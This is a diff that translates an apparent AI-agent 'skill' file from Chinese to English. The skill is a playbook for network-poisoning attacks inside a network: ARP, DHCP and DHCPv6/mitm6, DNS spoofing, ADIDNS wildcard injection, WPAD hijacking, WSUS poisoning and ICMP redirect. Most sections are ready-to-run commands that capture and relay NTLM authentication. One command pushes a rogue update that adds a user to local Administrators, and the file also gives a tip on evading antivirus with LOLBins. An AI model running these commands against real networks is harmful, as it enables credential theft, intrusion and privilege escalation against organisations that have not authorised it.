@@ -1,92 +1,94 @@
 ---
 name: network-poisoning-attack
-description: "内网渗透中的网络层投毒和协议欺骗攻击方法论。当需要通过网络投毒获取 NTLM 认证、实现中间人攻击时使用。覆盖 ARP 投毒、DHCP 投毒、DHCPv6/mitm6 欺骗、DNS 欺骗、ADIDNS 记录注入、WPAD 劫持、WSUS 投毒、ICMP 重定向、NBT Name Overwrite。通常作为 NTLM relay 攻击的前置步骤。"
+description: "Network-layer poisoning and protocol deception methodology for internal network penetration testing. Use when NTLM authentication must be captured through network poisoning or a man-in-the-middle position must be achieved. Covers ARP poisoning, DHCP poisoning, DHCPv6/mitm6 deception, DNS spoofing, ADIDNS record injection, WPAD hijacking, WSUS poisoning, ICMP redirect, and NBT Name Overwrite. Typically used as a prerequisite step for NTLM relay attacks."
+zh-signals: "内网网络层投毒与协议欺骗（ARP、DHCP、DNS、WPAD、WSUS）获取 NTLM 认证。信号:arp投毒,dhcpv6,dns欺骗,mitm6,wpad,ntlm"
+when-to-use: "Use when performing internal network poisoning to capture NTLM authentication or achieve man-in-the-middle, often as a prerequisite for NTLM relay."
 metadata:
-  tags: "arp poisoning,dhcp poisoning,dhcpv6,mitm6,dns spoofing,adidns,wpad,wsus,icmp redirect,nbt name overwrite,mitm,中间人,投毒,欺骗,bettercap,ettercap,dnstool,pywsus,responder,inveigh"
+  tags: "arp poisoning,dhcp poisoning,dhcpv6,mitm6,dns spoofing,adidns,wpad,wsus,icmp redirect,nbt name overwrite,mitm,man-in-the-middle,poisoning,deception,bettercap,ettercap,dnstool,pywsus,responder,inveigh"
   category: "lateral"
 ---
 
-# 网络层投毒与欺骗攻击
+# Network-Layer Poisoning and Deception Attacks
 
-通过污染网络层协议（ARP、DHCP、DNS、WPAD 等）实现中间人定位或强制认证触发，是 NTLM relay 攻击最常用的前置步骤。
+Poisoning network-layer protocols (ARP, DHCP, DNS, WPAD, etc.) to obtain a man-in-the-middle position or force authentication triggers is the most common prerequisite for NTLM relay attacks.
 
-## 触发条件
+## Trigger Conditions
 
-- 内网需要通过网络投毒获取凭证或实现中间人
-- 需要作为 NTLM relay 的前置步骤进行投毒
-- 需要 ARP/DHCP/DHCPv6/DNS/WPAD/WSUS 投毒
+- The internal network requires poisoning to capture credentials or achieve man-in-the-middle
+- Poisoning is needed as a prerequisite step for NTLM relay
+- ARP/DHCP/DHCPv6/DNS/WPAD/WSUS poisoning is required
 
-## 前置要求
+## Prerequisites
 
-- 同网段物理接入（大部分技术要求同广播域）
-- 域用户凭证（ADIDNS 注入需要）
-- 工具: bettercap, Responder, mitm6, dnstool.py, Inveigh, pywsus, dnschef
+- Physical access on the same network segment (most techniques require the same broadcast domain)
+- Domain user credentials (required for ADIDNS injection)
+- Tools: bettercap, Responder, mitm6, dnstool.py, Inveigh, pywsus, dnschef
 
-## 技术选择决策树
+## Technology Selection Decision Tree
 
 ```
-网络位置与条件？
-├── 同广播域
-│   ├── 快速 MITM → ARP 投毒 (高检测风险)
-│   ├── IPv6 未禁用 → DHCPv6/mitm6 (推荐)
-│   ├── DHCP 环境 → DHCP 投毒
-│   └── 被动监听 → LLMNR/NBT-NS (已有 → ntlm-relay-attack)
-├── 域环境 + 域凭证
-│   ├── ADIDNS 记录注入 (最稳定)
-│   └── WPAD 劫持 (结合 ADIDNS/DHCPv6)
-├── WSUS 使用 HTTP
-│   └── WSUS 投毒
-└── DNS 已控制
-    └── DNS 欺骗
+Network position and conditions?
+├── Same broadcast domain
+│   ├── Fast MITM → ARP poisoning (high detection risk)
+│   ├── IPv6 not disabled → DHCPv6/mitm6 (recommended)
+│   ├── DHCP environment → DHCP poisoning
+│   └── Passive listening → LLMNR/NBT-NS (already covered → ntlm-relay-attack)
+├── Domain environment + domain credentials
+│   ├── ADIDNS record injection (most stable)
+│   └── WPAD hijacking (combined with ADIDNS/DHCPv6)
+├── WSUS uses HTTP
+│   └── WSUS poisoning
+└── DNS already controlled
+    └── DNS spoofing
 ```
 
-## 技术对比表
+## Technology Comparison Table
 
-| 投毒方式 | 前置条件 | 检测风险 | 适用场景 |
+| Poisoning Method | Prerequisites | Detection Risk | Applicable Scenario |
 |----------|----------|----------|----------|
-| ARP 投毒 | 同广播域 | 高 (ARP 异常) | 快速 MITM，需即时效果 |
-| DHCP 投毒 | 同广播域 | 中 | 持久 DNS/WPAD 注入 |
-| DHCPv6/mitm6 | IPv6 未禁用 | 低 | 推荐，隐蔽获取 NTLM |
-| DNS 欺骗 | 已控制 DNS 流量 | 低 | 精准域名劫持 |
-| ADIDNS 注入 | 域凭证 | 极低 | 最稳定，域级 DNS 投毒 |
-| WPAD 劫持 | 见各子方式 | 中 | 透明代理捕获认证 |
-| WSUS 投毒 | HTTP WSUS | 中 | 代码执行 (非凭证) |
-| ICMP 重定向 | 同网段 | 低 | 现代 OS 多忽略 |
+| ARP poisoning | Same broadcast domain | High (ARP anomalies) | Fast MITM requiring immediate effect |
+| DHCP poisoning | Same broadcast domain | Medium | Persistent DNS/WPAD injection |
+| DHCPv6/mitm6 | IPv6 not disabled | Low | Recommended, covert NTLM capture |
+| DNS spoofing | DNS traffic already controlled | Low | Precise domain hijacking |
+| ADIDNS injection | Domain credentials | Extremely low | Most stable, domain-level DNS poisoning |
+| WPAD hijacking | See each sub-method | Medium | Transparent proxy authentication capture |
+| WSUS poisoning | WSUS over HTTP | Medium | Code execution (not credential capture) |
+| ICMP redirect | Same subnet | Low | Mostly ignored by modern OSes |
 
 ---
 
-## 1. ARP 投毒
+## 1. ARP Poisoning
 
-### 原理
+### How It Works
 
-ARP 协议无认证机制，攻击者发送伪造 ARP 响应将自身 MAC 地址绑定到网关或目标 IP，实现流量劫持。分为双向（fullduplex）和单向投毒。
+The ARP protocol has no authentication mechanism. An attacker sends forged ARP responses to bind their own MAC address to the gateway or target IP, achieving traffic hijacking. This is split into bidirectional (fullduplex) and unidirectional poisoning.
 
-### 核心命令
+### Core Commands
 
 ```bash
-# bettercap 交互模式
+# bettercap interactive mode
 bettercap -iface eth0
 
-# 单向投毒（仅欺骗目标，让目标流量经过攻击者）
+# Unidirectional poisoning (spoof only the target so its traffic passes through the attacker)
 set arp.spoof.targets $CLIENT_IP
 set arp.spoof.internal false
 set arp.spoof.fullduplex false
 arp.spoof on
 
-# 双向投毒（同时欺骗目标和网关）
+# Bidirectional poisoning (spoof both the target and the gateway)
 set arp.spoof.targets $CLIENT_IP
 set arp.spoof.fullduplex true
 arp.spoof on
 
-# 开启 IP 转发（Linux）
+# Enable IP forwarding (Linux)
 sysctl -w net.ipv4.ip_forward=1
 iptables --policy FORWARD ACCEPT
 ```
 
-### SMB 场景：any.proxy 重定向到攻击者 445
+### SMB Scenario: Redirecting any.proxy to the Attacker's 445
 
 ```bash
-# 将目标发往 $SERVER_IP:445 的流量重定向到攻击者
+# Redirect traffic from the target to $SERVER_IP:445 to the attacker
 set any.proxy.src_address $SERVER_IP
 set any.proxy.src_port 445
 set any.proxy.dst_address $ATTACKER_IP
@@ -94,68 +96,68 @@ set any.proxy.dst_port 445
 any.proxy on
 ```
 
-### IP 伪装绕过（SNAT/DNAT）
+### IP Spoofing Bypass (SNAT/DNAT)
 
 ```bash
-# 当目标检查源 IP 时，需要 iptables NAT 伪装
+# When the target checks the source IP, use iptables NAT to spoof it
 iptables -t nat -A PREROUTING -p tcp -d $SERVER_IP --dport 445 -j DNAT --to-destination $ATTACKER_IP:445
 iptables -t nat -A POSTROUTING -p tcp -s $CLIENT_IP --dport 445 -j SNAT --to-source $SERVER_IP
 ```
 
-### Relay 衔接
+### Relay Handoff
 
-ARP 投毒获得 MITM 位置后，使用 any.proxy 将 SMB/HTTP 流量重定向到 ntlmrelayx 监听端口。
+After ARP poisoning establishes the MITM position, use any.proxy to redirect SMB/HTTP traffic to the ntlmrelayx listener port.
 
 ---
 
-## 2. DHCP 投毒
+## 2. DHCP Poisoning
 
-### 原理
+### How It Works
 
-通过 Responder 的 DHCP 模式响应客户端 DHCP 请求，注入恶意 DNS 服务器或 WPAD 配置。效果持续到客户端 DHCP 租约过期或重启。
+Responder's DHCP mode answers client DHCP requests and injects malicious DNS server or WPAD configuration. The effect lasts until the client DHCP lease expires or the client reboots.
 
-### 核心命令
+### Core Commands
 
 ```bash
-# DNS 注入模式（注入 DNS + WPAD）
+# DNS injection mode (inject DNS + WPAD)
 responder -I "eth0" -wPdD
 
-# 仅 WPAD 注入
+# WPAD injection only
 responder -I "eth0" -wPd
 
-# -d: DHCP 响应中注入 DNS
-# -D: DHCP 响应中注入 WPAD
-# -w: 启动 WPAD rogue proxy
-# -P: 强制 NTLM 认证（Proxy Auth）
+# -d: inject DNS in DHCP responses
+# -D: inject WPAD in DHCP responses
+# -w: start the WPAD rogue proxy
+# -P: force NTLM authentication (Proxy Auth)
 ```
 
-### Relay 衔接
+### Relay Handoff
 
 ```bash
-# WPAD 注入 + ntlmrelayx 作为代理
+# WPAD injection + ntlmrelayx as the proxy
 ntlmrelayx.py -t $TARGET --http-port 3128
-# Responder 将 WPAD 配置指向 $ATTACKER_IP:3128
+# Responder points the WPAD configuration to $ATTACKER_IP:3128
 ```
 
 ---
 
-## 3. DHCPv6/mitm6（推荐）
+## 3. DHCPv6/mitm6 (Recommended)
 
-### 原理
+### How It Works
 
-Windows 默认启用 IPv6 且优先使用 IPv6 DNS。mitm6 伪装 DHCPv6 服务器为目标分配 IPv6 DNS，将所有 DNS 查询指向攻击者。隐蔽性高，对 IPv4 网络无影响。
+Windows enables IPv6 by default and prefers IPv6 DNS. mitm6 impersonates a DHCPv6 server to assign the target an IPv6 DNS server, pointing all DNS queries to the attacker. Stealth is high and IPv4 networks are unaffected.
 
-### 核心命令
+### Core Commands
 
 ```bash
-# 启动 mitm6
+# Start mitm6
 mitm6 --interface eth0 --domain $DOMAIN
 
-# 指定目标（减少影响范围）
+# Specify the target (to limit the blast radius)
 mitm6 --interface eth0 --domain $DOMAIN --host-allowlist $TARGET_HOSTNAME
 ```
 
-### bettercap 替代方案
+### bettercap Alternative
 
 ```bash
 set dhcp6.spoof.domains $DOMAIN
@@ -164,37 +166,37 @@ set dns.spoof.domains *.$DOMAIN
 dns.spoof on
 ```
 
-### Relay 衔接
+### Relay Handoff
 
 ```bash
-# 经典组合：mitm6 + ntlmrelayx
-# 终端 1
+# Classic combo: mitm6 + ntlmrelayx
+# Terminal 1
 mitm6 -d $DOMAIN
 
-# 终端 2
+# Terminal 2
 ntlmrelayx.py -t ldaps://$DC -wh wpad.$DOMAIN --delegate-access
-# -wh: 设置 WPAD 主机名，触发 HTTP 认证
-# --delegate-access: 自动配置 RBCD
+# -wh: set the WPAD hostname to trigger HTTP authentication
+# --delegate-access: automatically configure RBCD
 ```
 
 ---
 
-## 4. DNS 欺骗
+## 4. DNS Spoofing
 
-### 原理
+### How It Works
 
-在已获得 MITM 位置（ARP 投毒等）后，拦截并篡改 DNS 响应，将目标域名解析到攻击者 IP。需要先有流量劫持能力。
+After a MITM position has been obtained (ARP poisoning, etc.), intercept and tamper with DNS responses to resolve the target domain to the attacker IP. Traffic hijacking capability is required first.
 
-### 核心命令
+### Core Commands
 
 ```bash
-# dnschef（独立 DNS 代理）
+# dnschef (standalone DNS proxy)
 dnschef --fakeip $ATTACKER_IP --interface $ATTACKER_IP --port 53
 
-# 指定域名
+# Specify domains
 dnschef --fakedomains $DOMAIN --fakeip $ATTACKER_IP --interface $ATTACKER_IP
 
-# Responder 内置 DNS
+# Built-in DNS in Responder
 responder -I "eth0"
 
 # bettercap dns.spoof
@@ -203,156 +205,156 @@ set dns.spoof.address $ATTACKER_IP
 dns.spoof on
 ```
 
-### Relay 衔接
+### Relay Handoff
 
-DNS 欺骗将目标对特定服务的访问重定向到攻击者，配合 ntlmrelayx 捕获认证请求。
+DNS spoofing redirects the target's access to a specific service to the attacker, which then captures authentication requests in conjunction with ntlmrelayx.
 
 ---
 
-## 5. ADIDNS 记录注入
+## 5. ADIDNS Record Injection
 
-### 原理
+### How It Works
 
-Active Directory 集成 DNS（ADIDNS）默认允许任何域用户创建新的 DNS 子对象。通过添加通配符记录（*），可将所有未明确定义的 DNS 查询解析到攻击者 IP。这是最稳定、检测风险最低的投毒方式。
+Active Directory Integrated DNS (ADIDNS) allows any domain user to create new DNS child objects by default. By adding a wildcard record (*), all DNS queries that are not explicitly defined can be resolved to the attacker IP. This is the most stable poisoning method with the lowest detection risk.
 
-### 核心命令
+### Core Commands
 
 ```bash
-# 检查是否存在 WINS forward lookup（type 65281，会干扰通配符）
+# Check for a WINS forward lookup (type 65281, which interferes with wildcards)
 dnstool.py -u '$DOMAIN\$USER' -p '$PASSWORD' --record '@' --action 'query' $DC
 
-# 添加通配符记录
+# Add the wildcard record
 dnstool.py -u '$DOMAIN\$USER' -p '$PASSWORD' --record '*' --action add --data $ATTACKER_IP $DC
 
-# 指定 DNS 分区（--legacy 用于旧 DNS 区域，--forest 用于森林级）
+# Specify the DNS partition (--legacy for legacy DNS zones, --forest for forest level)
 dnstool.py -u '$DOMAIN\$USER' -p '$PASSWORD' --record '*' --action add --data $ATTACKER_IP --legacy $DC
 
-# 清理（务必在完成后执行）
+# Clean up (must be executed after the operation)
 dnstool.py -u '$DOMAIN\$USER' -p '$PASSWORD' --record '*' --action remove $DC
 ```
 
-### Powermad 替代
+### Powermad Alternative
 
 ```powershell
-# 添加通配符 A 记录
+# Add a wildcard A record
 New-ADIDNSNode -Node * -Data $ATTACKER_IP
-# 添加指定记录
+# Add a specific record
 New-ADIDNSNode -Node wpad -Data $ATTACKER_IP
 ```
 
-### Inveigh 自动化
+### Inveigh Automation
 
 ```powershell
-# 自动 ADIDNS 注入 + 投毒
+# Automated ADIDNS injection + poisoning
 Invoke-Inveigh -ADIDNS combo,ns,wildcard -ADIDNSThreshold 3
-# combo: 通配符 + NS 记录组合
-# ADIDNSThreshold: 未解析查询达到阈值后才注入（降低误报）
+# combo: wildcard + NS record combination
+# ADIDNSThreshold: inject only after unresolved queries reach the threshold (reduces false positives)
 ```
 
-### Relay 衔接
+### Relay Handoff
 
-通配符记录使所有不存在的主机名解析到攻击者，配合 Responder/ntlmrelayx 自动捕获认证。
+The wildcard record resolves all non-existent hostnames to the attacker, and Responder/ntlmrelayx automatically capture the authentication.
 
 ---
 
-## 6. WPAD 劫持
+## 6. WPAD Hijacking
 
-### 原理
+### How It Works
 
-WPAD（Web Proxy Auto-Discovery）解析链：DHCP Option 252 → DNS 查询 wpad.$DOMAIN → LLMNR/NBT-NS 广播。劫持任一环节即可让目标通过攻击者代理上网，触发 NTLM 认证。
+WPAD (Web Proxy Auto-Discovery) resolution chain: DHCP Option 252 → DNS query for wpad.$DOMAIN → LLMNR/NBT-NS broadcast. Hijacking any link in this chain makes the target proxy its traffic through the attacker, triggering NTLM authentication.
 
-### 旧系统（未打 MS16-077）
+### Legacy Systems (without MS16-077)
 
 ```bash
-# LLMNR/NBT-NS 响应 WPAD 查询
+# Respond to WPAD queries via LLMNR/NBT-NS
 responder -I "eth0" -wP
 # -w: WPAD rogue proxy
-# -P: 强制 Proxy NTLM 认证
+# -P: force Proxy NTLM authentication
 ```
 
-### 新系统（GQBL bypass）
+### New Systems (GQBL bypass)
 
-MS16-077 后 WPAD 不再通过广播解析，需要 ADIDNS 注入绕过：
+After MS16-077, WPAD is no longer resolved via broadcast and ADIDNS injection is required to bypass this:
 
 ```bash
-# 方式 1: 添加 wpad A 记录
+# Method 1: add a wpad A record
 dnstool.py -u '$DOMAIN\$USER' -p '$PASSWORD' --record 'wpad' --action add --data $ATTACKER_IP $DC
 
-# 方式 2: 添加 NS 记录委派
+# Method 2: add an NS record delegation
 ```
 
 ```powershell
-# PowerShell NS 记录（将 wpad 子域委派到攻击者）
+# PowerShell NS record (delegate the wpad subdomain to the attacker)
 New-ADIDNSNode -Node wpad -Type NS -Data 'attacker.$DOMAIN'
-# 攻击者运行 dnschef 响应 wpad 查询
+# The attacker runs dnschef to answer wpad queries
 ```
 
-### DHCPv6 方式
+### DHCPv6 Method
 
 ```bash
-# 当 DNS 中 wpad 记录已存在但指向错误时
+# When a wpad record already exists in DNS but points to the wrong place
 mitm6 --domain $DOMAIN
-# mitm6 通过 DHCPv6 让目标使用攻击者 DNS，直接控制 wpad 解析
+# mitm6 uses DHCPv6 to make the target use the attacker DNS, directly controlling wpad resolution
 ```
 
-### Relay 衔接
+### Relay Handoff
 
-WPAD 代理自动触发 HTTP NTLM 认证，直接转发到 ntlmrelayx。
+The WPAD proxy automatically triggers HTTP NTLM authentication, which is forwarded directly to ntlmrelayx.
 
 ---
 
-## 7. WSUS 投毒
+## 7. WSUS Poisoning
 
-### 原理
+### How It Works
 
-如果 WSUS（Windows Server Update Services）使用 HTTP 而非 HTTPS，攻击者可在 MITM 位置下替换更新包，实现代码执行。注意这是代码执行而非凭证获取。
+If WSUS (Windows Server Update Services) uses HTTP instead of HTTPS, an attacker in an MITM position can replace update packages and achieve code execution. Note that this is code execution rather than credential capture.
 
-### 检查 WSUS 配置
+### Checking WSUS Configuration
 
 ```bash
-# 远程查询（需要访问权限）
+# Remote query (requires access rights)
 reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v wuserver
-# 如果是 http:// 开头 → 可投毒
+# If it starts with http:// → it can be poisoned
 ```
 
-### 核心命令
+### Core Commands
 
 ```bash
-# 启动恶意 WSUS 服务器
+# Start the malicious WSUS server
 python3 pywsus.py --host $ATTACKER_IP --port 8530 \
   --executable /path/to/PsExec64.exe \
   --command '/accepteula /s cmd.exe /c "net localgroup Administrators $DOMAIN\\$USER /add"'
 ```
 
-### bettercap 流量重定向
+### bettercap Traffic Redirection
 
 ```bash
-# ARP 投毒后重定向 WSUS 流量
+# Redirect WSUS traffic after ARP poisoning
 set any.proxy.src_port 8530
 set any.proxy.dst_address $ATTACKER_IP
 set any.proxy.dst_port 8530
 any.proxy on
 ```
 
-### 补充说明
+### Additional Notes
 
-- CVE-2020-1013: WSUS 本地提权漏洞，可在本地利用
-- 触发更新检查: `wuauclt /detectnow /updatenow` 或 `UsoClient StartScan`
-- 推荐使用 LOLBin（PsExec64.exe 等签名二进制）避免触发 AV
+- CVE-2020-1013: WSUS local privilege escalation vulnerability, exploitable locally
+- Trigger an update check: `wuauclt /detectnow /updatenow` or `UsoClient StartScan`
+- Prefer LOLBins (signed binaries such as PsExec64.exe) to avoid triggering AV
 
-### Relay 衔接
+### Relay Handoff
 
-WSUS 投毒主要用于代码执行，不直接衔接 NTLM relay。
+WSUS poisoning is mainly used for code execution and does not hand off directly to NTLM relay.
 
 ---
 
-## 8. ICMP 重定向
+## 8. ICMP Redirect
 
-### 原理
+### How It Works
 
-ICMP Redirect 消息通知主机更优路由路径，攻击者伪造 ICMP Redirect 将目标流量重定向到自身。但现代 OS（Windows 10+、Linux 默认）大多忽略 ICMP Redirect。
+ICMP Redirect messages tell hosts about a better routing path. An attacker forges ICMP Redirect messages to redirect target traffic to itself. However, most modern OSes (Windows 10+, Linux by default) ignore ICMP Redirect.
 
-### 核心命令
+### Core Commands
 
 ```bash
 python3 tools/Icmp-Redirect.py \
@@ -363,52 +365,52 @@ python3 tools/Icmp-Redirect.py \
   --route $DNS_SERVER
 ```
 
-### 实用价值
+### Practical Value
 
-有限。现代操作系统默认禁用或忽略 ICMP Redirect，仅在特定老旧环境中有效。
+Limited. Modern operating systems disable or ignore ICMP Redirect by default, and it only works in specific legacy environments.
 
 ---
 
 ## 9. NBT Name Overwrite
 
-### 原理
+### How It Works
 
-NetBIOS 名称覆盖攻击通过发送 NetBIOS Name Overwrite 包修改目标的名称表，将特定名称关联到攻击者 IP。
+The NetBIOS name overwrite attack sends NetBIOS Name Overwrite packets to modify the target's name table, associating specific names with the attacker IP.
 
-### 现状
+### Current State
 
-实际工具支持有限，主要作为理论参考。在实战中优先使用 ADIDNS 或 DHCPv6 等更可靠的方式。
+Actual tool support is limited and it is mainly a theoretical reference. In real engagements, prefer more reliable methods such as ADIDNS or DHCPv6.
 
 ---
 
-## 组合利用示例
+## Combined Exploitation Examples
 
-### mitm6 + ntlmrelayx（最常用）
+### mitm6 + ntlmrelayx (Most Common)
 
 ```bash
-# 终端 1: DHCPv6 投毒
+# Terminal 1: DHCPv6 poisoning
 mitm6 -d $DOMAIN
 
-# 终端 2: LDAP relay + RBCD
+# Terminal 2: LDAP relay + RBCD
 ntlmrelayx.py -t ldaps://$DC -wh wpad.$DOMAIN --delegate-access
 ```
 
 ### ADIDNS + Responder + relay
 
 ```bash
-# Step 1: 注入通配符 DNS 记录
+# Step 1: inject the wildcard DNS record
 dnstool.py -u '$DOMAIN\$USER' -p '$PASSWORD' --record '*' --action add --data $ATTACKER_IP $DC
 
-# Step 2: 启动 Responder（关闭 SMB/HTTP）
+# Step 2: start Responder (SMB/HTTP disabled)
 responder -I eth0
 
-# Step 3: 启动 ntlmrelayx
+# Step 3: start ntlmrelayx
 ntlmrelayx.py -t $TARGET -smb2support
 ```
 
 ---
 
-## 深入参考
+## Further Reading
 
-- → [references/layer2-poisoning.md](references/layer2-poisoning.md) — ARP/DHCP/DHCPv6/ICMP 投毒详细命令与配置
-- → [references/name-resolution-poisoning.md](references/name-resolution-poisoning.md) — ADIDNS/WPAD/WSUS/DNS 欺骗完整攻击链
+- → [references/layer2-poisoning.md](references/layer2-poisoning.md) — detailed commands and configuration for ARP/DHCP/DHCPv6/ICMP poisoning
+- → [references/name-resolution-poisoning.md](references/name-resolution-poisoning.md) — complete attack chains for ADIDNS/WPAD/WSUS/DNS spoofing
